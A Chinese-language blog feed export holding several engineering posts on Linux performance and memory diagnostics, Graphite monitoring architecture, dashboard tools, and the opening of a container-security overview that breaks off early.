%system:系统（内核运作）占用CPU资源 %iowait:I/O等待率。 进程详细1234567891011$ ps auxwtest 1551 0.2 0.1 6452 4776 ? S 19:25 0:00 Test.pl CTP00004.PRS00034 1 300test 1553 2.6 0.4 18196 16424 ? S 19:25 0:00 /Test.pl 00001.PRS00034test 1555 2.6 0.4 18168 16396 ? S 19:25 0:00 /Test.pl 00002.PRS00034test 1557 2.8 0.4 18132 16432 ? S 19:25 0:00 /Test.pl 00004.PRS00034test 1606 0.0 0.0 50060 916 ? Sl 19:25 0:00 /bin/PingTest -f CTP00004test 1612 2.5 0.4 18156 16452 ? S 19:25 0:00 /Test.pl 00014.PRS00034test 1629 2.1 0.4 18416 16696 ? S 19:25 0:00 /Test.pl 00015.PRS00034test 2253 2.7 0.3 12868 11160 ? R 19:25 0:00 -w mrtg MRTG\_00027.cfg logtest 2254 3.6 0.3 12864 11184 ? S 19:25 0:00 -w mrtg MRTG\_00028.cfg logtest 2261 2.4 0.2 12640 11004 ? S 19:25 0:00 -w mrtg MRTG\_00030.cfg log 输出参数： %CPU：该进程的CPU使用率 %memb：物理内存百分比 VSZ、RSS：虚拟／物理内存 STAT：进程状态（非常重要） TIME：CPU占用时间 SWAP吞吐1234567891011121314$sar -W17:20:01 pswpin/s pswpout/s17:30:01 0.00 0.0017:40:01 0.00 0.0017:50:01 0.00 0.0018:00:01 0.00 0.0018:10:01 0.00 0.0018:20:01 0.00 0.0018:30:01 0.00 0.0018:40:01 0.00 0.0018:50:02 0.00 0.0019:00:01 0.00 0.0019:10:02 0.00 0.00Average: 0.00 0.00 输出参数： pswpin/s:每秒系统换入的页面数 pswpout/s:每秒系统换出的页面数 发生频繁的交换时，服务器的吞吐量性能会大幅下降。 vmstat(Report Virtual Memory Statistics)实时确认CPU使用率及实际的I/O等待时间1234$ vmstat kthr memory page disk faults cpu r b w swap free re mf pi po fr de sr s2 s2 s2 s2 in sy cs us sy id 0 0 0 45411448 17973032 140 1470 13 41 33 0 0 -0 -0 -0 -0 2753 313459 4984 16 3 81 解决方案优化的真正工作是“找出系统瓶颈并加以解决”，我们所能做的就是“充分发挥硬／软件本来的性能，解决可能存在的问题”。例如，同样是I/O问题，我们可以通过增加内存来缓解，也可以调整调度方案来优化（时间换空间），但是更多的情况是，优化应用程序的I/O算法效果更佳。 最后，重温一句经典格言 别臆断，请监控 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works:Memory]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Works-Memory%2F</url>
    <content type="text"><![CDATA[摘要 经典内存异常：Out of Memory (OOM) Killer 我的内存利用率为什么特别高？ Linux 内存的分类 Linux 内存的计算 Linux 进程的内存 Linux 应用内存分配 内存是计算机中与CPU进行沟通的桥梁，用于暂时存放CPU中的运算数据。Linux 内核的内存管理机制设计得非常精妙，对于 Linux 内核的性能有很大影响。在早期的 Unix 系统中，fork 启动新进程时，由于从父进程往子进程复制内存信息需要消耗一定的时间，因此启动多个进程时存在性能瓶颈。现在的 Linux 内核则通过“写时复制（copy-on-write）”等机制提高了创建进程的效率；也正是因为这个原因，关于 Linux 内存分配、计算、空闲判断有一些特别的地方需要注意。 内存异常： Out of Memory (OOM) Killer12$ dmesg | tail[1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child 最常见的内存管理异常就是 Out of memory 问题。通常是因为某个应用程序大量请求内存导致系统内存不足造成的，触发 Linux 内核里的 Out of Memory (OOM) killer，OOM killer 会杀掉某个进程以释放内存留给系统内核用。它实际上算一种保护机制，不致于让系统立刻崩溃，有些壮士断腕的意思。 内核检测到内存利用不足，就会选择并杀掉某个“bad”进程。如何判断和选择一个 “bad” 进程呢? 算法和思路其实非常朴素（简单）：最 bad 的那个进程就是那个占用内存最多的进程。内核源代码详见 linux/mm/oom_kill.c 。 我的内存利用率为什么特别高？ 内存利用率（概括）: free 内存利用率（进程）: top 123内存空闲率 = (Total - Used) / Total = (7982M - 7503M) / 7983M X 100 % = 6 %“真实的” 内存空闲率 = (free + shared + buffers + cached)/ Total = 5860 M / 7983M X 100 % = 73.4 % 实际情况是系统运行正常、不存在内存不足的情况，对于应用程序来说，“真实的” 内存空闲率是 73.4% 。如果要回答这个问题，必须了解内存管理的基础 —— 物理地址空间和逻辑地址空间。 按照用途，内存可以划分为“内核内存”和“用户内存”（用户进程及磁盘高速缓存），包括内核本身在内，程序在访问物理内存时，并不直接指定物理地址，而是指定逻辑地址。CPU 上搭载的硬件 MMU （Memory Management Unit）会参照物理-逻辑地址对应关系表实现对映射后物理地址上的数据访问。x86 架构中逻辑地址空间限制在 4GB ，在 x86_64 架构中则没有此限制。 Linux 内存的分类用户内存的分类有两组概念比较重要：匿名内存和File-backed内存；Active 和 Inactive 。它们的区别如下： 匿名内存：用来存储用户进程计算过程中间的数据，与物理磁盘的文件没有关系； File-backed内存：用作磁盘高速缓存，其物理内存与物理磁盘上的文件是对应的； Active : 刚被使用过的数据的内存空间； Inactive : 包含有长时间未被使用过的数据的内存空间； Shmem（shared memory）指的就是 tmpfs 所使用的内存 —— 一个基于内存的文件系统，提供可以接近零延迟的快速存储区域。Linux 可以将空闲内存用于缓存，并且在应用程序需要的时候收回。“­/+ buffers/cache”: 提供了关于内存利用率更加准确的数值。buffers: buffer cache,用于块设备I/O ; cached: page cache, 用于文件系统。例如： 12345678# free total used free shared buff/cache availableMem: 1012720 168756 23576 52024 820388 754520Swap: 262140 88 262052# mkdir /mnt/ramdisk# mount -t tmpfs -o size=512m tmpfs /mnt/ramdisk# vi /etc/fstab# tmpfs /mnt/ramdisk tmpfs nodev,nosuid,noexec,nodiratime,size=1024M 0 0 内存利用率（详细）：cat /proc/meminfo 123456789101112131415161718192021222324252627282930313233343536373839404142$ cat /proc/meminfoMemTotal: 8174352 kBMemFree: 376952 kBBuffers: 527412 kBCached: 5178924 kBSwapCached: 60 kBActive: 3061760 kBInactive: 4066588 kBActive(anon): 1112780 kBInactive(anon): 314156 kBActive(file): 1948980 kBInactive(file): 3752432 kBUnevictable: 6724 kBMlocked: 6724 kBSwapTotal: 16779884 kBSwapFree: 16777400 kBDirty: 376 kBWriteback: 0 kBAnonPages: 1428844 kBMapped: 64632 kBShmem: 644 kBSlab: 557384 kBSReclaimable: 338272 kBSUnreclaim: 219112 kBKernelStack: 4024 kBPageTables: 12440 kBNFS_Unstable: 0 kBBounce: 0 kBWritebackTmp: 0 kBCommitLimit: 20867060 kBCommitted_AS: 2406484 kBVmallocTotal: 34359738367 kBVmallocUsed: 111536 kBVmallocChunk: 34359455060 kBHugePages_Total: 0HugePages_Free: 0HugePages_Rsvd: 0HugePages_Surp: 0Hugepagesize: 2048 kBDirectMap4k: 6384 kBDirectMap2M: 2080768 kBDirectMap1G: 6291456 kB Linux 内存的计算各类内存的计算公式如下： Shmem = 磁盘高速缓存（buffers/cached）- Filed-backed内存（file） = 匿名内存（anon）- AnonPages用户内存 = Active(file) + Inactive(file) + Active(anon) + Inactive(anon) + Unevictable = buffers + cached + AnonPages 内核内存 = Memtotal - (MemFree + Active + Inactive + Unevictable) 12345678910111213141516171819202122$ cat /proc/meminfo | grep ActiveActive: 3065880 kBActive(anon): 1116748 kBActive(file): 1949132 kB-bash-4.3$-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep InActive-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep InactiveInactive: 4067224 kBInactive(anon): 314156 kBInactive(file): 3753068 kB-bash-4.3$-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep anonActive(anon): 1120720 kBInactive(anon): 314156 kB-bash-4.3$-bash-4.3$ cat /proc/meminfo | grep fileActive(file): 1949236 kBInactive(file): 3753096 kB-bash-4.3$ Linux 进程的内存123456-bash-4.3$ ps -e -o 'pid,comm,args,pcpu,rsz,vsz,stime,user,uid' | grep slview | sort -nrk530029 java /slview/jdk150/jdk1.5.0_06/ 2.5 1337496 2678836 Dec07 slview 5432231574 bash -bash 0.0 2028 70592 17:08 slview 5432223398 crond crond 0.0 1688 102180 16:10 slview 54322 1123 crond crond 0.0 1688 102180 Dec10 slview 5432228252 crond crond 0.0 1596 102028 16:45 slview 54322 执行“ps aux” 后输出的各进程的 RSS (resident set size), 表示进程占用内存的大小，单位是KB。 需要注意的是，RSS 值实际上是基于 pmap 命令，表示“该进程正在使用的物理内存的总和”。pmap 提供了进程的内存映射，也可以支持多个进程的内存状态显示（pmap pid1 pid2 pid3）。与 ldd 命令类似，pmap 命令可以查看到程序调用的路径。如果查看一个已经运行，但是又不知道程序路径的程序，使用pmap更快捷。 123456789101112131415161718192021222324$ pmap -x 3002930029: /slview/jdk150/jdk1.5.0_06/bin/java -com.apache.TestAddress Kbytes RSS Dirty Mode Mapping0000000008048000 60 48 0 r-x-- java0000000008057000 8 8 8 rwx-- java0000000009f1d000 23184 23140 23140 rwx-- [ anon ]000000004d1f1000 108 96 0 r-x-- ld-2.5.so000000004d20c000 4 4 4 r-x-- ld-2.5.so000000004d20d000 4 4 4 rwx-- ld-2.5.so000000004d214000 1356 548 0 r-x-- libc-2.5.so000000004d367000 8 8 8 r-x-- libc-2.5.so00007f581e51d000 16 16 0 r--s- huanan-product-2.6.1-snapshots.jar00007f581e521000 24 24 0 r--s- dt.jar00007f581e527000 36 36 0 r--s- gnome-java-bridge.jar00007f581e530000 32 32 8 rw-s- 1322800007f581e538000 4 4 4 rw--- [ anon ]00007f581e539000 4 4 0 r---- [ anon ]00007f581e53a000 8 8 8 rw--- [ anon ]00007fffe9eb7000 84 32 32 rw--- [ stack ]00007fffe9fff000 4 4 0 r-x-- [ anon ]ffffffffff600000 4 0 0 r-x-- [ anon ](部分省略)---------------- ------ ------ ------total kB 2484196 36180 26880 /proc/PID/status 支持的选项有： VmData: data段大小 VmExe: text段大小 Vmlib: 共享库的使用量 VmRSS: 物理内存使用量 VmSwap: 交换空间的使用量 1234567891011121314151617181920212223242526272829303132333435363738$ cat /proc/30029/statusName: javaState: S (sleeping)Tgid: 30029Pid: 30029PPid: 29983TracerPid: 0Uid: 54322 54322 54322 54322Gid: 54323 54323 54323 54323FDSize: 8192Groups: 10 54323VmPeak: 2754032 kBVmSize: 2678836 kBVmLck: 0 kBVmHWM: 1337912 kBVmRSS: 1337512 kBVmData: 2575692 kBVmStk: 1012 kBVmExe: 60 kBVmLib: 101564 kBVmPTE: 3048 kBThreads: 98SigQ: 0/63825SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000004SigIgn: 0000000000000001SigCgt: 1000000180005cceCapInh: 0000000000000000CapPrm: 0000000000000000CapEff: 0000000000000000CapBnd: ffffffffffffffffCpus_allowed: ffffffffCpus_allowed_list: 0-31Mems_allowed: 00000000,Mems_allowed_list: 0voluntary_ctxt_switches: 12468nonvoluntary_ctxt_switches: 19 Linux 应用内存分配 类似 Java 之类的虚拟机应用程序可以设置内存参数，例如:Xms128m JVM初始分配的堆内存Xmx512m JVM最大允许分配的堆内存XX:PermSize=64M JVM初始分配的非堆内存XX:MaxPermSize=128M JVM最大允许分配的非堆内存 如果该应用需要较大的内存空间，可以调整为 -Xmx1024m、-Xmx2048m 以保障应用程序的运行性能，XX:MaxPermSize 设置过小会导致内存溢出，java.lang.OutOfMemoryError: PermGen space。但是 需要特别注意 的是：Xmx 绝对不能超过最大物理内存，或者说需要保留一定的剩余内存空间，否则将有可能导致其它进程因为没有可用内存而阻塞，甚至无法登陆机器 。 正如摔跤游戏一样，内存管理的法则就是让进程在 留有余地 的前提下搏杀。 拓展阅读 How The Kernel Manages Your Memory Anatomy of a Program in Memory Getting Physical With Memory Go Memory Management 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 linux内存分配与回收 Linux Ate my RAM 理解和配置 Linux 下的 OOM Killer |@vpsee 图解JAVA多线程 LINUX类主机JAVA应用程序占用CPU、内存过高分析手段 | 2015-12-04 丁启良 DBAplus社群 JVM源码分析之一个Java进程究竟能创建多少线程 | 原创 2016-12-06 寒泉子 你假笨]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（七）Graphite 体系结构详解]]></title>
    <url>%2F2017%2F12%2F04%2FVisualization-Graphite%2F</url>
    <content type="text"><![CDATA[概要 1.指标采集器 - Dropwizard Metrics, StatsD 2.监听器 - Carbon, graphite-ng, Riemann 3.存储数据库 – Whisper, InfluxDB, Cyanite Josh Dreyfuss: Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application Graphite 是处理可视化和指标数据的优秀开源工具。它有强大的查询 API 和相当丰富的插件功能设置。事实上，Graphite 指标协议（metrics protocol）是许多指标收集工具的事实标准格式。然而，Graphite 并不总是一个可以简单部署和使用的工具。由于设计方面的原因，加上它使用过程中涉及大量的小 I/O 操作，在规模化应用中会遇到一些问题，而且部署起来可能有点麻烦。 Graphite 部署痛苦的部分原因是，它是由三个不同的元素组成（当然，如果包括指标采集就是四个），这些取决于你的环境，只有其中一个或多个默认元素可能不能满足你的需要。￼ 虽然 Graphite 包含三个组件可能会导致一些实施的问题，但也有积极的成果。每一个模块块都是一个独立的单元，这样你就可以按照实际的需要混合和匹配使用三个组件中的哪一个。同时意味着您可以为自己构建一个完全定制化的 Graphite 部署方案。 让我们逐一来看看你需要做些什么，对于 Graphite 的每一个组成部分来说，都可以是一个 Graphite 的方案或者是非 Graphite 的替代品。 1. 指标采集器 - Dropwizard Metrics, StatsDGraphite 部署方案中的的第一个步骤根本不是 Graphite 的组成部分。这是因为 Graphite 自身并不支持采集任何指标；Graphite 需要有人将指标数据发送给它。这通常不是一个特别大的限制，因为大多数指标采集器都支持以 Graphite 格式提供指标数据，但仍然有一些东西需要注意。我们可选的不同指标采集器可以列一个庞大的列表，但是没有一个工具是包含在基础 Graphite 中的。 选择你的指标采集器 – Graphite 文档中提供了一个工具列表，包括流行的选择像 CollectD 和 Diamond ，但它很少更新，所以你还可以考虑以下两个方案： Dropwizard Metrics – Metrics 是一个 Java 库，通过一系列指标为你提供生产环境的可视化。它有一个 Graphite Reporter，可以将所有的指标数据发送到 Graphite 实例。对于需要在 Java 生态中使用 Graphite 的场景来说，它是一个不错的选择。 StatsD – StatsD 是一个基于 Node.js 运行的网络守护进程，来自 Etsy (网络电商平台)。它可以监听一系列统计、指标数据，并将它们聚集到像 Graphite 这样的工具中。StatsD 也可以和很多其他的可视化、指标采集工具一起工作。 小结： Graphite 不和特定的指标采集器捆绑。然而， Graphite 指标协议是非常常见的，因此不难找到一个或多个与您的应用程序一起工作的协议。既然有这么多的指标采集器和 Graphite 配合良好，你不需要只选择一个，你可以选择从多个数据源发送指标。 2. 监听器 - Carbon, graphite-ng, and RiemannGraphite 的另一部分是用于监听发送的指标数据并将其写入磁盘的组件 —— Carbon （原意：碳）。Carbon 是由守护进程组成的，在工作方式方面有一些内置的灵活性。 在基本的小规模部署中， Carbon 守护程序会监听指标数据并将它们报告给 Whisper 存储数据库。然而，随着规模的增长可以添加一个聚合元素（A ggregation），它在一段时间内缓冲指标数据，然后将它们发送给一个大块中的 Whisper 。你也可以使用 Carbon 传递指标副本到多个 Carbon 后台。当你达到更高的规模、需要多个 Carbon 后台程序来处理传入的指标数据时，这一点特别有用。 缺点和潜在的问题 —— 人们通常遇到的问题通常跟规模相关。就规模应用而言，Carbon 有以下几个缺点 ： 一个单独的 Carbon 守护程序处理能力有限，因为它是用 Python 语言设计的。本机代码不支持一次多个线程同时运行（ Multiple threads），所以可能出现 Carbon 守护程序刚刚启动时丢弃指标数据的情况。 Carbon 有一个它一次能处理负载数量的阈值，但这个阈值并没有传达给你。 Carbon 并没有持续打开 Whisper 的文件句柄，所以存储每个指标都需要多步的完整读/写序列。 基于标准的 Graphite 部署实例中，这些情况的解决方法是将工作划分为中继器（ Carbon relays） 和 缓存（Carbon caches ）。尽管如此，您仍然需要注意负载，因为超过了 Carbon 的负荷会导致数据丢失。如果这个后果对你来说无法接受，可以看看 Carbon 的替代解决方案。 Carbon 替代方案Carbon 的另一种替代方法是 graphite-ng，本质上是基于 Go 语言重写了一遍 Carbon ，以解决上面提到的几个问题。迄今为止，该项目的重点是改进 Carbon 的中继和聚合功能。如果你喜欢 Carbon 的功能，但是又想要绕过一些性能方面的限制，这是一个不错的选择。 另一个替代方案是 Reimann。基于 Clojure 语言实现（属于 LISP 编程语言家族），Reimann 是用来聚集和处理“事件流（event streams）”。事件和流都是相当简单的概念，Riemann 能代替 Carbon 把它们发送到 Graphite 实例。它在这个过程增加了一些提供了额外的好处，例如告警功能。如果你想设计一个远离 Carbon 的架构，这是一个很好的选择，还能加入一些涉及告警方面的能力。 争议观点 Cyanite does not only “work with carbon”. Just like influxdb, it implements the graphite line receiver protocol and thus replaces carbon-cache. Riemann can’t send data to your graphite deployment “in place of carbon”. It can act as a much more powerful carbon-aggregator, but it doesn’t replace carbon-cache. 小结： Carbon 负责监听指标数据并将它们写入到您的存储数据库，但经常在规模化应用上遇到性能问题。有一些现成的替代方案可以解决这个问题。 3. 存储数据库 – Whisper, InfluxDB, Cyanite您需要选择的下一个组件是存储数据库。在 Graphite 体系结构中称之为 Whisper。Whisper 是一种固定大小的数据库，用于存储时间序列数据，在保存和取样方面提供了相当的精确度。在标准的 Graphite 部署中，Carbon 将指标值写入 Whisper 存储，用于在 Graphite-web 组件中实现可视化。 缺点和潜在问题：Whisper 基于 RRD（Round- Robin Database），但写入操作的时候有一些关键性的差异，例如回填项目历史数据和处理不规则数据的能力。这里有一些指标和可视化工具的有用特性，但它们的实现都是基于某种折衷。 因为 Whisper 是用Python编写的，所以相对来说性能较慢； 按照 Whisper 的设计，它会遇到一些存储空间的问题，因为每个指标都需要一个文件，并且都是单个实例。这是一种有意的权衡，以实现前面提到的一些好处，但不可否认，Whisper 对磁盘空间的利用效率较低。 由于 Carbon 和 Whisper 在设计方面的原因，它们最终都涉及到大量的 IO 请求。当你超越小型部署时，磁盘 IO 的伸缩能力会成为摆在面前的一个问题。 Whisper 替代方案你可以通过部署固态硬盘（SSD）或者其它一些设计解决 Whisper 的性能问题，但也只是点到为止。如果数据库部分正是你所需要的，那么有几个选择可以考虑。 目前主要的一个选择是 influxdata（InfluxDB）。influxdata 是一个基于 LevelDB、用 Go 语言编写的时间序列数据库。influxdata 能够解决一些磁盘 IO 写优化问题，同时不要求 one metric = one file 。 influxdata 支持 Carbon 使用的协议，使它能够悄悄置换 Whisper，实现类似 SQL的查询语言。甚至已经有一些项目设计用来使 influxdata 的置换更简便易行，例如 graphite-influxdb 项目 ，使得可以和 Graphite 的 API 无缝衔接。influxdata 属于非常有前途的新兴项目，可以在广泛的范围内与其他工具一起工作。 另一个选择是使用基于 Cassandra 的存储数据库。得益于 graphite-cyanite 项目的工作，基于 Cyanite 数据库可以很容易实现这一目的。 Cyanite 的开发规划目标就是在 Graphite 体系结构中替换 Whisper ，这意味着它可以和 Carbon 、 Graphite-web 一起工作（需要少量的一些依赖）。使用 Cyanite 有助于解决 Whisper 在大规模部署场景中存在的性能和高可用问题。 小结 ： Graphite 体系结构中，数据存储组件是 Whisper 。在大规模应用中，除非你在硬件方面大量投入、把它分解成复杂的手动集群模式，否则将悄悄地会遇到一些性能和可用性问题。如果你需要关注这些问题，可以使用数据库的替代选项来提高性能和可用性。 4. 可视化组件 – Graphite-Web 和 Grafana一旦你收集并存储了指标数据，就下来的步骤就是可视化它们。Graphite-web 的角色就是提供可视化。 Graphite-web 是一种基于 Django 的 Web 应用程序，提供指标数据可视化和交互能力。它在数据的处理方面提供了相当多的能力，但可视化组件并不十分美观（也就是说 “土”、“丑”）。Graphite-web 作为前端组件，我们将着重讨论用户体验的相关内容。￼ Graphite-web 替代方案归功于卓越的 Graphite API ，目前有一系列第三方仪表盘工具可以支持 Graphite 。因为有如此众多的可视化选项，它们的优劣其实主要取决于个人品味，再次不作过多扩展，但我确实想特别指出其中的一个。也许最具潜力的 Graphite 可视化替代方案， 或至少是人们谈论最多的是 Grafana 。 Grafana 是一个开源的仪表盘工具，可以兼容 Graphite 和 InfluxDB 。Grafana 曾经只是一个基于 Elasticsearch 存储的前端仪表盘工具，从 V2.0 版本开始，它拥有了一个支持用户自定义的后端存储组件。Grafana 在设计之初即考虑到支持 Graphite 创建更加优美的可视化组件，因此它非常适合替换默认的 Graphite-web 。Grafana 功能相当丰富，性能稳定。Grafana 拥有一个后端组件，如果你也可以找到纯粹的前端工具，Graphite 文档中提供了工具列表。 小结： 如果你觉得 Graphite 提供的默认可视化效果过于基础和乏味，有大量的可视化替代方案可以选择。其中一些是纯粹客户端，有的包含一个存储你建立的仪表盘后端组件。不管你要什么，你都能在这里找到东西。 5. 代码级指标 – TrendsOverOps 发布了一个新的功能，可以让你把代码级指标从 JVM 应用程序中的错误、与变量状态在一起发送到 Graphite 。详细：https://www.overops.com 123456789101112&#123; backends: [ "./backends/graphite" ] // identify this backend as Graphite graphitePort: 2003, // port of Graphite server graphiteHost: "graphite.example.com", // hostname or IP of Graphite server deleteCounters: true, graphite: &#123; // Graphite tweaks for Takipi prefixCounter: "", prefixGauge: "", globalPrefix: "", legacyNamespace: false &#125;&#125; 总结所有针对 Graphite 的投诉都集中于（它的工作性能不够稳定，仪表盘丑陋！规模化部署是硬伤！），但不妨碍它成为一个很流行的工具。如果你想要一个开源的指标和可视化工具，为许多企业级工具提供支持，那么 Graphite 值得一试。其中最重要的一点是，你可以自定义数据内容。Graphite 并不是由完全特定的组件一起工作，其中的乐趣何在 ？经过一些尝试和错误，您可以在您自己的环境中构建一个完全定制化的、非常有用 Graphite （或类似 Graphite 的）部署方案。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 实时数据可视化 Graphite vs. Grafana: Build the Best Monitoring Architecture for Your Application influxdata.com: Storage Engine Graphite的百万Metrics实践之路]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（六）常见的可视化仪表盘(DashBoard)]]></title>
    <url>%2F2017%2F11%2F23%2FVisualization-DashBoard%2F</url>
    <content type="text"><![CDATA[摘要 仪表盘（DashBoard） 决策路径 (Decision Path) ELK Stack（Elasticsearch、Logtash、Kibana） Graphite &amp; Grafana Keen IO 、Librato、DataDog 仪表盘（DashBoard） 指标工具 (Metrics Tools) 可视化工具 (Visualization Tools) 日志管理工具 (Log Management tools) 决策路径 (Decision Path) OpenSource or SaaS ? 开源软件：需要自己安装和配置 ( Graphite and ELK stack ) SaaS：需要改造现有程序、嵌入代码 ( Keen IO, Librato, and DataDog) Analytics or Visualization复杂分析: Keen IO 、 ELK stack监控/指标呈现：Graphite（Grafana）、 DataDog Budget and Environment 迁移成本：例如现有资产中已经有 Graphite 数据，采用Grafana可即时提升数据可视化效果 成本预算：例如日志分析器（log analyzer）的带宽和存储 Options ELK Stack （Elasticsearch、Logtash、Kibana） Graphite &amp; Grafana : 基于数据分析的网络态势感知 Keen IO Librato DataDog 选项 价格 优点 弱点 ELK Stack 免费（Elastic paid plans 提供不同级别的专家服务） Strong Communities;Kibana 包含商业分析；ES 与 Kibana 易集成 安装配置；大规模使用时的机器成本 Graphite 免费 real-time graphs of numeric and time-differentiated data 数据采集和复杂分析能力弱； Grafana 免费 支持多种数据源，提供丰富的插件 不提供数据存储，不提供数据采集 Keen IO Free to $2000/月，按量收费 实时/归档数据可视化能力强；易于共享和提取数据 需要嵌入代码，依赖和拓展管理难度 Librato 按指标收费 监测和管理云应用，提供可以高度定制化的报表及告警功能 计费复杂，不提供数据采集，需要嵌入代码，依赖和拓展管理难度 DataDog 免费版，标准版（主机数量，$15台/月） app、软硬件数据统一 目前不发展数据分析 ELK StackElasticsearch: 搜索和分析能力Logstash: 日志聚合器(Aggregator)Kibana：DashBoard Graphite &amp; Grafana Graphite: 开发语言（Python），支持数据存储、图形化和可视化，本身并不收集数据，需要和采集工具配合。 Grafana: 开发语言（Go），提供了一个指标集的仪表盘，可以将 Graphite 作为数据源（DataSource）。 Grafana provides many additional features and spiffy looking visuals to Graphite Keen IOKeen IO is a SaaS analytics infrastructure platform. Librato监测和管理云应用；提供可以高度定制化的报表；提供多样化的告警通知方式：邮件、HipChat、Campfire、HTTP Post DataDogDataDog is SaaS monitoring tool.DataDog 主要围绕数据聚集和呈现，并不关注数据分析，即强调所有硬件、软件产生的数据实现汇聚统一。 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QuickStart]]></title>
    <url>%2F2017%2F11%2F16%2FQuickStart%2F</url>
    <content type="text"><![CDATA[QuickStart RiboseYim’s Blog Root Catalog 2018 年度盘点 Engineering Blog Engineering Index Study The Master Commands: Linux、Mac、Windows 数据可视化（十）公共数据源列表 WordBook Machine Learning WordBook 我的电子书列表 《The Linux Perf Master| 操作系统性能专家》 《The Cyber-Security Master | 网络安全专家》 《The Data Visualization Master | 数据可视化专家》 《The Machine Learning Master | 机器学习专家》 Mybridge:Read great articles relevant for your work 知识分享圈子 知识星球|睿哥读书会（年费制） 知识星球|系统运维专家（免费加入） 知识星球|Machine Learning 小组（免费加入） 知识星球|经济学人翻译社（免费加入）]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:Linux容器安全的十重境界]]></title>
    <url>%2F2017%2F11%2F12%2FDevOps-Container-Security%2F</url>
    <content type="text"><![CDATA[摘要容器安全解决方案需要考虑不同技术栈和容器生命周期的不同阶段。 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC 提纲 1.容器操作系统与多租户 2.容器内容（使用可信源） 3.容器注册 (容器镜像加密访问) 4.构建过程安全 5.控制集群中可部署的内容 6.容器编排：加强容器平台安全 7.网络隔离 8.存储 9.API 管理, 终端安全和单点登录 (SSO) 10.角色和访问控制管理 容器提供了一种简单的应用程序打包方法将它们无缝地从开发、测试环境部署到生产环境。它有助于确保各种环境中的一致性，包括物理服务器、虚拟机（VM）或私有或公共云。领先的组织基于这些好处迅速采用容器，以便轻松地开发和管理增加业务价值的应用程序。 企业应用需要强壮的安全性，任何在容器中运行基础服务的人都会问：“容器是安全的吗？”、“可以让我们的应用程序信任容器吗？” 保护容器非常类似于确保任何正在运行的进程。在部署和运行容器之前，您需要考虑整个解决方案技术栈的安全性。您还需要考虑在应用程序和容器的完整生命周期的安全性。 请尝试在这 10 个方面加强容器的不同层次、不同技术栈和不同生命周期阶段的安全性。 1. 